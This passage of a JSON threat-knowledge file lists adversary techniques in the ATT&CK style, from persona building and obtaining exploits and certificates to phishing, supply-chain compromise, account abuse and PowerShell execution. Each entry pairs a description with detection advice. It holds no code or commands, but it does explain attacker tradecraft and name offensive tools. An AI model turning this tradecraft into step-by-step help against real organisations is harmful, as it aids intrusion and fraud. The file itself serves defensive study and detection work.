        "description": " \nBefore compromising a victim, adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.  \n \n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.  \n \nThese accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex:  Spearphishing via Service ).  ",
        "detection": "\nConsider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).\n\n"
      },
      "T1585.002": {
        "name": "Email Accounts",
        "description": " \nBefore compromising a victim, adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct  Phishing for Information or  Phishing .  \nAdversaries may also take steps to cultivate a persona around the email account, such as through use of  Social Media Accounts , to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex:  Domains ).  \n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).\n\n"
      },
      "T1588": {
        "name": "Obtain Capabilities",
        "description": " \nBefore compromising a victim, adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle. \nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.  \n \n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.\n\n"
      },
      "T1588.001": {
        "name": "Malware",
        "description": " \nBefore compromising a victim, adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors. \nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.\n\n"
      },
      "T1588.002": {
        "name": "Tool",
        "description": " \nBefore compromising a victim, adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex:  PsExec ). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as  Cobalt Strike . Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.  \n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.\n\n"
      },
      "T1588.003": {
        "name": "Code Signing Certificates",
        "description": " \nBefore compromising a victim, adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.  \nUsers and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. \nPrior to  Code Signing , adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as Code Signing or Install Root Certificate.\n\n"
      },
      "T1588.004": {
        "name": "Digital Certificates",
        "description": " \nBefore compromising a victim, adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. \nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex:  Web Protocols ) or even enabling  Man-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e.  Install Root Certificate ). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.  \n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.  \n\nAdversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.  ",
        "detection": "\nConsider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. Some server-side components of adversary tools may have default values set for SSL/TLS certificates. Detection efforts may be focused on related behaviors, such as Web Protocols, Asymmetric Cryptography, and/or Install Root Certificate.\n\n"
      },
      "T1588.005": {
        "name": "Exploits",
        "description": " \nBefore compromising a victim, adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.  \n \n \n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.  \n \nIn addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).  \n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation. \nAdversaries may use exploits during various phases of the adversary lifecycle (i.e.  Exploit Public-Facing Application ,  Exploitation for Client Execution ,  Exploitation for Privilege Escalation ,  Exploitation for Defense Evasion ,  Exploitation for Credential Access ,  Exploitation of Remote Services , and  Application or System Exploitation ).  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).\n\n"
      },
      "T1588.006": {
        "name": "Vulnerabilities",
        "description": " \nBefore compromising a victim, adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.  \n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e.  Exploits ) or to attempt to develop one themselves (i.e.  Exploits ).  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).\n\n"
      }
    }
  },
  "TA0001": {
    "name": "Initial Access",
    "description": "\nThe adversary is trying to get into your network.Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.\n",
    "technique": {
      "T1189": {
        "name": "Drive-by Compromise",
        "description": " \nAdversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring  Application Access Token . \nMultiple ways of delivering exploit code to a browser exist, including: A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting. Malicious ads are paid for and served through legitimate ad providers. Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content). \nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.  \n\nTypical drive-by compromise process: A user visits a website that is used to host the adversary controlled content. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes. Upon finding a vulnerable version, exploit code is delivered to the browser. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place. In some cases a second visit to the website after the initial scan is required before exploit code is delivered. \nUnlike  Exploit Public-Facing Application , the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ. \nAdversaries may also use compromised websites to deliver a user to a malicious application designed to  Steal Application Access Token s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.  \n ",
        "detection": "\nFirewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.Network intrusion detection systems, sometimes with SSL/TLS MITM inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.Detecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\n\n"
      },
      "T1190": {
        "name": "Exploit Public-Facing Application",
        "description": " \nAdversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)  \n, standard services (like SMB  \nor SSH), network device administration and management protocols (like SNMP and Smart Install  \n \n), and any other applications with Internet accessible open sockets, such as web servers and related services.  \nDepending on the flaw being exploited this may include  Exploitation for Defense Evasion . \nIf an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies. \nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.  \n \n ",
        "detection": "\nMonitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n"
      },
      "T1133": {
        "name": "External Remote Services",
        "description": " \nAdversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as  Windows Remote Management can also be used externally. \nAccess to  Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.  \nAccess to remote services may be used as a redundant or persistent access mechanism during an operation.  ",
        "detection": "\nFollow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\n"
      },
      "T1200": {
        "name": "Hardware Additions",
        "description": " \nAdversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping  \n, man-in-the middle encryption breaking  \n, keystroke injection  \n, kernel memory reading via DMA  \n, adding new wireless access to an existing network  \n, and others.  ",
        "detection": "\nAsset management systems may help with the detection of computer systems or network devices that should not exist on a network. Endpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.\n\n"
      },
      "T1566": {
        "name": "Phishing",
        "description": " \nAdversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. \nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of  Valid Accounts . Phishing may also be conducted via third-party services, like social media platforms.  ",
        "detection": "\nNetwork intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.Because most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once User Execution occurs.\n\n"
      },
      "T1566.001": {
        "name": "Spearphishing Attachment",
        "description": " \nAdversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon  User Execution to gain execution. \nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.  ",
        "detection": "\nNetwork intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution or usage of malicious scripts.\n\n"
      },
      "T1566.002": {
        "name": "Spearphishing Link",
        "description": " \nAdversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging  User Execution . The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to  Steal Application Access Token s, like OAuth tokens, in order to gain access to protected applications and information.  \n ",
        "detection": "\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.Because this technique usually involves user interaction on the endpoint, many of the possible detections take place once User Execution occurs.\n\n"
      },
      "T1566.003": {
        "name": "Spearphishing via Service",
        "description": " \nAdversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services. \nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.  ",
        "detection": "\nBecause most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution or usage of malicious scripts.\n\n"
      },
      "T1091": {
        "name": "Replication Through Removable Media",
        "description": " \nAdversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.  ",
        "detection": "\nMonitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.\n\n"
      },
      "T1195": {
        "name": "Supply Chain Compromise",
        "description": " \nAdversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. \nSupply chain compromise can take place at any stage of the supply chain including: Manipulation of development tools Manipulation of a development environment Manipulation of source code repositories (public or private) Manipulation of source code in open-source dependencies Manipulation of software update/distribution mechanisms Compromised/infected system images (multiple cases of removable media infected at the factory)  \n  \n Replacement of legitimate software with modified versions Sales of modified/counterfeit products to legitimate distributors Shipment interdiction \nWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.  \n  \n  \nTargeting may be specific to a desired victim set  \nor malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.  \n  \nPopular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.  \n ",
        "detection": "\nUse verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.\n\n"
      },
      "T1195.001": {
        "name": "Compromise Software Dependencies and Development Tools",
        "description": " \nAdversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.  \n \nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.  ",
        "detection": "\nUse verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. \n\n"
      },
      "T1195.002": {
        "name": "Compromise Software Supply Chain",
        "description": " \nAdversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. \nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.  \n  \n  ",
        "detection": "\nUse verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. \n\n"
      },
      "T1195.003": {
        "name": "Compromise Hardware Supply Chain",
        "description": " \nAdversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.  ",
        "detection": "\nPerform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.\n\n"
      },
      "T1199": {
        "name": "Trusted Relationship",
        "description": " \nAdversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network. \nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such,  Valid Accounts used by the other party for access to internal network systems may be compromised and used.  ",
        "detection": "\nEstablish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.\n\n"
      },
      "T1078": {
        "name": "Valid Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence. \nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.  \n ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.001": {
        "name": "Default Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.  \n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen  Private Keys or credential materials to legitimately connect to remote environments via  Remote Services .  \n ",
        "detection": "\nMonitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.\n\n"
      },
      "T1078.002": {
        "name": "Domain Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.  \nDomain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.  \n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as  OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.  ",
        "detection": "\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Perform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.\n\n"
      },
      "T1078.003": {
        "name": "Local Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \nLocal Accounts may also be abused to elevate privileges and harvest credentials through  OS Credential Dumping . Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.  ",
        "detection": "\nPerform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.\n\n"
      },
      "T1078.004": {
        "name": "Cloud Accounts",
        "description": " \nAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.  \n \n \n\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a  Trusted Relationship . Similar to  Domain Accounts , compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.  ",
        "detection": "\nMonitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.\n\n"
      }
    }
  },
  "TA0002": {
    "name": "Execution",
    "description": "\nThe adversary is trying to run malicious code.Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. \n",
    "technique": {
      "T1059": {
        "name": "Command and Scripting Interpreter",
        "description": " \nAdversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of  Unix Shell while Windows installations include the  Windows Command Shell and  PowerShell . \nThere are also cross-platform interpreters such as  Python , as well as those commonly associated with client applications such as  JavaScript/JScript and  Visual Basic . \nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in  Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.  ",
        "detection": "\nCommand-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\n\n"
      },
      "T1059.001": {
        "name": "PowerShell",
        "description": " \nAdversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  \nAdversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the  Start-Process cmdlet which can be used to run an executable and the  Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). \nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk. \nA number of PowerShell-based offensive testing tools are available, including  Empire ,  PowerSploit ,  PoshC2 , and PSAttack.  \n\nPowerShell commands/scripts can also be executed without directly invoking the  powershell.exe binary through interfaces to PowerShell's underlying  System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).  \n \n \n ",
